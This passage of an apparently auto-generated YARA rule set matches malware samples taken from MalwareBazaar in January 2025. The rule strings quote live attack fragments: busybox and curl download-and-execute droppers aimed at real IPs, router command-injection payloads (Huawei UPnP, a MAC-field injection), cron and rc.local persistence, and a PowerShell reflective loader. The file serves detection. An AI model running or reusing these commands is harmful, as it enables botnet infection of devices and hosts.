      $s13 = "pthread_create@GLIBC_2.34" fullword ascii
      $s14 = ".note.ABI-tag" fullword ascii
      $s15 = ".note.gnu.build-id" fullword ascii
      $s16 = "__FRAME_END__" fullword ascii
      $s17 = "completed.1" fullword ascii
      $s18 = "157.173.202.137" fullword ascii
      $s19 = "__isoc99_sscanf@GLIBC_2.7" fullword ascii
      $s20 = "connect" fullword ascii /* Goodware String - occured 429 times */
   condition:
      uint16(0) == 0x457f and filesize < 40KB and
      8 of them
}

rule c81d7f537eb3f5cb599bbbf5317ffc7583ecf3b7742e0f7cb7bfdd55a0a2c3a5 {
   meta:
      description = "evidences - file c81d7f537eb3f5cb599bbbf5317ffc7583ecf3b7742e0f7cb7bfdd55a0a2c3a5.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "c81d7f537eb3f5cb599bbbf5317ffc7583ecf3b7742e0f7cb7bfdd55a0a2c3a5"
   strings:
      $s1 = "handle_command" fullword ascii
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" fullword ascii
      $s3 = "GET / HTTP/1.1" fullword ascii
      $s4 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" fullword ascii
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" fullword ascii
      $s9 = "daemonize" fullword ascii
      $s10 = "threads.0" fullword ascii
      $s11 = "http_attack" fullword ascii
      $s12 = "_IO_stdin_used" fullword ascii
      $s13 = "frame_dummy" fullword ascii
      $s14 = "pthread_create@GLIBC_2.34" fullword ascii
      $s15 = ".note.ABI-tag" fullword ascii
      $s16 = ".note.gnu.build-id" fullword ascii
      $s17 = "__FRAME_END__" fullword ascii
      $s18 = "completed.0" fullword ascii
      $s19 = "__frame_dummy_init_array_entry" fullword ascii
      $s20 = "__GNU_EH_FRAME_HDR" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      8 of them
}

rule sig_8411a8b5f41adeaf842c3229500027dcebc4e82a560c923ca8a77996c1fcbe6e {
   meta:
      description = "evidences - file 8411a8b5f41adeaf842c3229500027dcebc4e82a560c923ca8a77996c1fcbe6e.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "8411a8b5f41adeaf842c3229500027dcebc4e82a560c923ca8a77996c1fcbe6e"
   strings:
      $s1 = "rm -rf arm; /bin/busybox ftpget 146.19.24.68 -P 8021 arm arm; chmod 777 arm; ./arm avtech.arm" fullword ascii
      $s2 = "rm -rf arm7; /bin/busybox ftpget 146.19.24.68 -P 8021 arm7 arm7; chmod 777 arm7; ./arm7 avtech.arm7" fullword ascii
      $s3 = "rm -rf arm5; /bin/busybox ftpget 146.19.24.68 -P 8021 arm5 arm5; chmod 777 arm5; ./arm5 avtech.arm5" fullword ascii
      $s4 = "cd /tmp" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule ab9c458e9f870f39c5066df3d40b83358e2a84817834974a338d645a657d8e9a {
   meta:
      description = "evidences - file ab9c458e9f870f39c5066df3d40b83358e2a84817834974a338d645a657d8e9a.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "ab9c458e9f870f39c5066df3d40b83358e2a84817834974a338d645a657d8e9a"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; curl -O http://83.222.191.90/oops/Kloki.ppc ; chmod 777 Kloki.ppc ; " ascii
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; curl -O http://83.222.191.90/oops/Kloki.ppc ; chmod 777 Kloki.ppc ; " ascii
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; curl http://83.222.191.90/oops/Kloki.spc ; chmod 777 Kloki.spc ; ./K" ascii
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; curl http://83.222.191.90/oops/Kloki.ppc ; chmod 777 Kloki.ppc ; ./K" ascii
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; curl -O http://83.222.191.90/oops/Kloki.spc ; chmod 777 Kloki.spc ; " ascii
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; curl http://83.222.191.90/oops/Kloki.spc ; chmod 777 Kloki.spc ; ./K" ascii
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; curl http://83.222.191.90/oops/Kloki.ppc ; chmod 777 Kloki.ppc ; ./K" ascii
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; curl -O http://83.222.191.90/oops/Kloki.spc ; chmod 777 Kloki.spc ; " ascii
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; curl http://83.222.191.90/oops/Kloki.x86 ; chmod 777 Kloki.x86 ; ./K" ascii
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; curl -O http://83.222.191.90/oops/Kloki.arm4 ; chmod 777 Kloki.arm4" ascii
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; curl -O http://83.222.191.90/oops/Kloki.x86 ; chmod 777 Kloki.x86 ; " ascii
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; curl -O http://83.222.191.90/oops/Kloki.mpsl ; chmod 777 Kloki.mpsl" ascii
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; curl -O http://83.222.191.90/oops/Kloki.mips ; chmod 777 Kloki.mips" ascii
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; curl http://83.222.191.90/oops/Kloki.x86 ; chmod 777 Kloki.x86 ; ./K" ascii
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; curl http://83.222.191.90/oops/Kloki.m68k ; chmod 777 Kloki.m68k ; " ascii
      $s16 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; curl http://83.222.191.90/oops/Kloki.arm6 ; chmod 777 Kloki.arm6 ; " ascii
      $s17 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86_64 ; curl -O http://83.222.191.90/oops/Kloki.x86_64 ; chmod 777 Kloki." ascii
      $s18 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; curl -O http://83.222.191.90/oops/Kloki.mips ; chmod 777 Kloki.mips" ascii
      $s19 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; curl http://83.222.191.90/oops/Kloki.m68k ; chmod 777 Kloki.m68k ; " ascii
      $s20 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; curl http://83.222.191.90/oops/Kloki.arm4 ; chmod 777 Kloki.arm4 ; " ascii
   condition:
      uint16(0) == 0x6463 and filesize < 10KB and
      8 of them
}

rule ef9aeef4f3b7ea00add3168043c866716d72353065d95b7b7dd981641d91f1ae {
   meta:
      description = "evidences - file ef9aeef4f3b7ea00add3168043c866716d72353065d95b7b7dd981641d91f1ae.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "ef9aeef4f3b7ea00add3168043c866716d72353065d95b7b7dd981641d91f1ae"
   strings:
      $x1 = "$iy=\"qQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNh" ascii
      $x2 = "$OE=\"qQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNh" ascii
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                           ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s8 = "///Ax88KGQAAAYlJhMEAxEEHzRYKGQAAAYlJhMFIP8zND846Pr//yhjAAAGJSZ6ERYgCksrDlogDQef+2E4zfr//yCzAAAAKMAAAAYlJhMGERYgcSnBu1ogetFfDmE4r" ascii
      $s9 = "jVmYzRhMzhmYTY4AGMyYWJhZmMwN2E4ZmM3OGE1NDkzZDllNGZmM2ZkMDA1YwBjMmJmM2YwM2Y4NTlmY2YzMmZlMmM5OTJiMTkzYjU2YzkAYzJjMGE4ODNmMDY1MDEwM" ascii
      $s10 = "2JpcERlVVJwenEAdFNHM0NGZGhHeUhvN2ZabXV2TDhkUERPWkF5TGpVenRaUmVQU0NuRnBFSGZGTmxmV1d4eDZUUUNQMzdITXAwNUhnMnRqWExEcgA2U005NlV1c2l3e" ascii
      $s11 = "[Reflection.Assembly]::Load($hgh2).GetType('GOOD').GetMethod('Execute').Invoke($null,$YOO)" fullword ascii
      $s12 = "DZJOUtvd0x2VHJKSW5HS0xwZFhmbUNIbFh2UDc0Q3VKaHU2akEyemo2VnVHeHAycjFVd2RsRXJReGdnSkhqWjJUd3BieDAAbHpKZmZXTDVVUmhLdU1wRkprQVk1a29pS" ascii
      $s13 = "$YOO=[object[]] ('CZOS:\\WinZOSdows\\MicrZOSosoft.NEZOST\\FraZOSmework\\v4ZOS.0.30ZOS319\\ReZOSgSvZOScs.exe'.replace('ZOS',''),$" ascii
      $s14 = "ckC1Ex8BdECMD3YANkC7lmiBYEBRUNvATEAE02pBTEABjlLBNkCzV/YADEA/jhUBUEAvT0KALkCtz0KADEAtz0KADEAvT0KAOkC+V4/ALkBU17IBRkDSF8VBikD0mA/A" ascii
      $s15 = "BAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s16 = "AAAAAAAAAAAAAAC" ascii /* base64 encoded string '           ' */
      $s17 = "AAAAAEAAAABAAAAA" ascii /* base64 encoded string '    @   @   ' */
      $s18 = "AABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '  @  @    @  @      @           ' */
      $s19 = "AAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                ' */
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '                      ' */
   condition:
      uint16(0) == 0x0a0d and filesize < 600KB and
      1 of ($x*) and 4 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _66d77a5665c6652a7b0da7263989804361a583280aa1ae17e04ff1968714c18e_c49a8680bbcb91e569b5aa0a695358dcb913b95335fdc05b0b36b0368c_0 {
   meta:
      description = "evidences - from files 66d77a5665c6652a7b0da7263989804361a583280aa1ae17e04ff1968714c18e.img, c49a8680bbcb91e569b5aa0a695358dcb913b95335fdc05b0b36b0368c0095ab.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "66d77a5665c6652a7b0da7263989804361a583280aa1ae17e04ff1968714c18e"
      hash2 = "c49a8680bbcb91e569b5aa0a695358dcb913b95335fdc05b0b36b0368c0095ab"
   strings:
      $s1 = "|/Yrdsvtj" fullword ascii
      $s2 = "Mzdx.Q|" fullword ascii
      $s3 = "FGGVbUT',\"" fullword ascii
      $s4 = "BgcX!r" fullword ascii
      $s5 = "cyKGm3" fullword ascii
      $s6 = "\\wqv_\"" fullword ascii
      $s7 = "};3\"m1" fullword ascii
      $s8 = "U??IX?a*" fullword ascii
      $s9 = "'a:|\\4lg" fullword ascii
      $s10 = "w|k;}5" fullword ascii
      $s11 = "^cWZiM@" fullword ascii
      $s12 = "L\"Qx\\<" fullword ascii
      $s13 = "JUA:p+" fullword ascii
      $s14 = "B7+fVR" fullword ascii
      $s15 = "!s@H<z" fullword ascii
      $s16 = "vB/z3Y" fullword ascii
      $s17 = "3KHB>S" fullword ascii
      $s18 = "l.~*Zq" fullword ascii
      $s19 = "DQ3i%3A" fullword ascii
      $s20 = "|%\"lN$" fullword ascii
   condition:
      ( ( uint16(0) == 0x0000 or uint16(0) == 0x6152 ) and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _66d77a5665c6652a7b0da7263989804361a583280aa1ae17e04ff1968714c18e_f03d63f432db307cd33bf6098a034a637f4167f9b31a696995bf48b440_1 {
   meta:
      description = "evidences - from files 66d77a5665c6652a7b0da7263989804361a583280aa1ae17e04ff1968714c18e.img, f03d63f432db307cd33bf6098a034a637f4167f9b31a696995bf48b4403f2a96.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "66d77a5665c6652a7b0da7263989804361a583280aa1ae17e04ff1968714c18e"
      hash2 = "f03d63f432db307cd33bf6098a034a637f4167f9b31a696995bf48b4403f2a96"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s2 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii
      $s4 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s5 = "CreateDecryptor" fullword ascii /* Goodware String - occured 76 times */
      $s6 = "GetDomain" fullword ascii /* Goodware String - occured 126 times */
      $s7 = "System.Security.Cryptography" fullword ascii /* Goodware String - occured 305 times */
      $s8 = "MemoryStream" fullword ascii /* Goodware String - occured 420 times */
      $s9 = "  </trustInfo>" fullword ascii
      $s10 = "System.Runtime.CompilerServices" fullword ascii /* Goodware String - occured 1950 times */
      $s11 = "System.Reflection" fullword ascii /* Goodware String - occured 2186 times */
      $s12 = "System" fullword ascii /* Goodware String - occured 2567 times */
      $s13 = "      </requestedPrivileges>" fullword ascii
   condition:
      ( ( uint16(0) == 0x0000 or uint16(0) == 0x0c2a ) and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6_846c3d091bb301e02fed99388214a9278d29c35087f77184f045bc1a88_2 {
   meta:
      description = "evidences - from files 7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6.elf, 846c3d091bb301e02fed99388214a9278d29c35087f77184f045bc1a88c75d70.elf, c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b7579391b.elf, c81d7f537eb3f5cb599bbbf5317ffc7583ecf3b7742e0f7cb7bfdd55a0a2c3a5.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6"
      hash2 = "846c3d091bb301e02fed99388214a9278d29c35087f77184f045bc1a88c75d70"
      hash3 = "c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b7579391b"
      hash4 = "c81d7f537eb3f5cb599bbbf5317ffc7583ecf3b7742e0f7cb7bfdd55a0a2c3a5"
   strings:
      $s1 = "handle_command" fullword ascii
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" fullword ascii
      $s3 = "GET / HTTP/1.1" fullword ascii
      $s4 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" fullword ascii
      $s6 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" fullword ascii
      $s7 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/16.17017" fullword ascii
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" fullword ascii
      $s9 = "daemonize" fullword ascii
      $s10 = "threads.0" fullword ascii
      $s11 = "http_attack" fullword ascii
      $s12 = "_IO_stdin_used" fullword ascii
      $s13 = "pthread_create@GLIBC_2.34" fullword ascii
      $s14 = ".note.ABI-tag" fullword ascii
      $s15 = ".note.gnu.build-id" fullword ascii
      $s16 = "__FRAME_END__" fullword ascii
      $s17 = "157.173.202.137" fullword ascii
      $s18 = "socket" fullword ascii /* Goodware String - occured 452 times */
      $s19 = "__data_start" fullword ascii
      $s20 = "__libc_start_main" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 70KB and ( 8 of them )
      ) or ( all of them )
}

rule _6e4ba85cc1b0594d079a3232d439608f518087b4ac21add5bf4d65c8f121f449_9bb3e85491646faf1935889fd6e0070a426e00992866d43ae6177345ae_3 {
   meta:
      description = "evidences - from files 6e4ba85cc1b0594d079a3232d439608f518087b4ac21add5bf4d65c8f121f449.elf, 9bb3e85491646faf1935889fd6e0070a426e00992866d43ae6177345aefe0f48.elf, a0f9fd63704b81084bb5316b26409b847d06b94a36194f13e23b83c2e852fedf.elf, dc233a4be89edaa57ef7e141757f42f0c998f9b14b2e31a729a1cda30d1e70e7.elf, de8cd8fb2ee55f0fef55e8b9d16d8e9269315fe424bed74a61c02777c3c825b3.elf, f6f3543047421d73a74deaec55d59843d0b0d648569795b8df64bd1de4ffdaeb.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "6e4ba85cc1b0594d079a3232d439608f518087b4ac21add5bf4d65c8f121f449"
      hash2 = "9bb3e85491646faf1935889fd6e0070a426e00992866d43ae6177345aefe0f48"
      hash3 = "a0f9fd63704b81084bb5316b26409b847d06b94a36194f13e23b83c2e852fedf"
      hash4 = "dc233a4be89edaa57ef7e141757f42f0c998f9b14b2e31a729a1cda30d1e70e7"
      hash5 = "de8cd8fb2ee55f0fef55e8b9d16d8e9269315fe424bed74a61c02777c3c825b3"
      hash6 = "f6f3543047421d73a74deaec55d59843d0b0d648569795b8df64bd1de4ffdaeb"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s3 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /h; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs; sh /tmp/.vs)</NewStatusURL><NewDown" ascii
      $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s6 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s7 = "HOST: 255.255.255.255:1900" fullword ascii
      $s8 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s9 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s10 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s11 = "service:service-agent" fullword ascii
      $s12 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s13 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s14 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s15 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s16 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s17 = "Cookie: user=admin" fullword ascii
      $s18 = "88645cefb1f9ede0e336e3569d75ee30" ascii
      $s19 = " default" fullword ascii
      $s20 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6_c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b75_4 {
   meta:
      description = "evidences - from files 7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6.elf, c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b7579391b.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6"
      hash2 = "c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b7579391b"
   strings:
      $s1 = "recv@GLIBC_2.0" fullword ascii
      $s2 = "snprintf@GLIBC_2.0" fullword ascii
      $s3 = "sleep@GLIBC_2.0" fullword ascii
      $s4 = "free@GLIBC_2.0" fullword ascii
      $s5 = "inet_ntoa@GLIBC_2.0" fullword ascii
      $s6 = "chdir@GLIBC_2.0" fullword ascii
      $s7 = "memset@GLIBC_2.0" fullword ascii
      $s8 = "strncmp@GLIBC_2.0" fullword ascii
      $s9 = "sendto@GLIBC_2.0" fullword ascii
      $s10 = "srand@GLIBC_2.0" fullword ascii
      $s11 = "strcmp@GLIBC_2.0" fullword ascii
      $s12 = "inet_pton@GLIBC_2.0" fullword ascii
      $s13 = "strlen@GLIBC_2.0" fullword ascii
      $s14 = "exit@GLIBC_2.0" fullword ascii
      $s15 = "inet_addr@GLIBC_2.0" fullword ascii
      $s16 = "setsockopt@GLIBC_2.0" fullword ascii
      $s17 = "fork@GLIBC_2.0" fullword ascii
      $s18 = "socket@GLIBC_2.0" fullword ascii
      $s19 = "GLIBC_2.0" fullword ascii
      $s20 = "time@GLIBC_2.0" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and ( 8 of them )
      ) or ( all of them )
}

rule _9bb3e85491646faf1935889fd6e0070a426e00992866d43ae6177345aefe0f48_a0f9fd63704b81084bb5316b26409b847d06b94a36194f13e23b83c2e8_5 {
   meta:
      description = "evidences - from files 9bb3e85491646faf1935889fd6e0070a426e00992866d43ae6177345aefe0f48.elf, a0f9fd63704b81084bb5316b26409b847d06b94a36194f13e23b83c2e852fedf.elf, dc233a4be89edaa57ef7e141757f42f0c998f9b14b2e31a729a1cda30d1e70e7.elf, f6f3543047421d73a74deaec55d59843d0b0d648569795b8df64bd1de4ffdaeb.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "9bb3e85491646faf1935889fd6e0070a426e00992866d43ae6177345aefe0f48"
      hash2 = "a0f9fd63704b81084bb5316b26409b847d06b94a36194f13e23b83c2e852fedf"
      hash3 = "dc233a4be89edaa57ef7e141757f42f0c998f9b14b2e31a729a1cda30d1e70e7"
      hash4 = "f6f3543047421d73a74deaec55d59843d0b0d648569795b8df64bd1de4ffdaeb"
   strings:
      $x1 = "/bin/bash -c \"sleep 10; rm -rf /tmp/%s; wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s > /dev/null 2>&1;" ascii
      $s2 = "crontab /tmp/crontab.tmp > /dev/null 2>&1" fullword ascii
      $s3 = "/tmp/crontab.tmp" fullword ascii
      $s4 = "%s > /dev/null 2>&1" fullword ascii
      $s5 = "chmod 777 /etc/rc.local > /dev/null 2>&1" fullword ascii
      $s6 = "\\FFFFFFVFWFPlEF5" fullword ascii
      $s7 = "\\FFFFFTFUFRFSlEF\"" fullword ascii
      $s8 = "\\FFFFFFFFFF" fullword ascii
      $s9 = "\\FFFFFFF" fullword ascii
      $s10 = "FVlFFFFFFFF]]lFFFF" fullword ascii
      $s11 = "OlFFFFFFFFBVF" fullword ascii
      $s12 = "FFFFFFFF]]lFFFF" fullword ascii
      $s13 = "FWlFFFFFFFF]]l" fullword ascii
      $s14 = "F\\OlEEEF#(\"F/(/2F/( )ll" fullword ascii
      $s15 = "lFFFFFFFFBVF" fullword ascii
      $s16 = "DlFFFFFFFF" fullword ascii
      $s17 = "lFFFFFFFF]]lFFFFLOlFFFFFFFF" fullword ascii
      $s18 = "lEEEF$#!/(F/(/2F/( )lEF6" fullword ascii
      $s19 = "OlFFFFFFFF" fullword ascii
      $s20 = "FW]FHIW]FHITF" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _21e1caaeb63ac4fe8001b8b1d89c6882d6833443ec6616ebdfb68daf60196327_533a9c0e91010b49c696492e53ba9af261c90e0645bb16e744b56fc47c_6 {
   meta:
      description = "evidences - from files 21e1caaeb63ac4fe8001b8b1d89c6882d6833443ec6616ebdfb68daf60196327.apk, 533a9c0e91010b49c696492e53ba9af261c90e0645bb16e744b56fc47c3a7f17.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "21e1caaeb63ac4fe8001b8b1d89c6882d6833443ec6616ebdfb68daf60196327"
      hash2 = "533a9c0e91010b49c696492e53ba9af261c90e0645bb16e744b56fc47c3a7f17"
   strings:
      $s1 = "android@android.com" fullword ascii
      $s2 = "android@android.com0" fullword ascii
      $s3 = "resources.arscPK" fullword ascii
      $s4 = "resources.arsc" fullword ascii
      $s5 = "AndroidManifest.xmlPK" fullword ascii
      $s6 = "classes.dex," fullword ascii
      $s7 = "Android1" fullword ascii
      $s8 = "APK Sig Block 42PK" fullword ascii
      $s9 = "Android1\"0 " fullword ascii
      $s10 = "classes.dexPK" fullword ascii
      $s11 = "080229013346" ascii
      $s12 = "080229013346Z" fullword ascii
      $s13 = "350717013346" ascii
      $s14 = ":g7./d" fullword ascii
      $s15 = "350717013346Z0" fullword ascii
      $s16 = "a<&`\"&a2" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _08b9b7469cf772f2b3c74b5e782f6d8767c4327c3e9f2199b80b40fa62c15d0a_9c1f30e6fa0046e86606378ca020d487f0d50f1c25c04cff57a209debd_7 {
   meta:
      description = "evidences - from files 08b9b7469cf772f2b3c74b5e782f6d8767c4327c3e9f2199b80b40fa62c15d0a.elf, 9c1f30e6fa0046e86606378ca020d487f0d50f1c25c04cff57a209debd760465.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "08b9b7469cf772f2b3c74b5e782f6d8767c4327c3e9f2199b80b40fa62c15d0a"
      hash2 = "9c1f30e6fa0046e86606378ca020d487f0d50f1c25c04cff57a209debd760465"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "RVSPUWVS" fullword ascii
      $s3 = "8$? 'oQY" fullword ascii
      $s4 = "f#F_R?" fullword ascii
      $s5 = "B28q/M" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

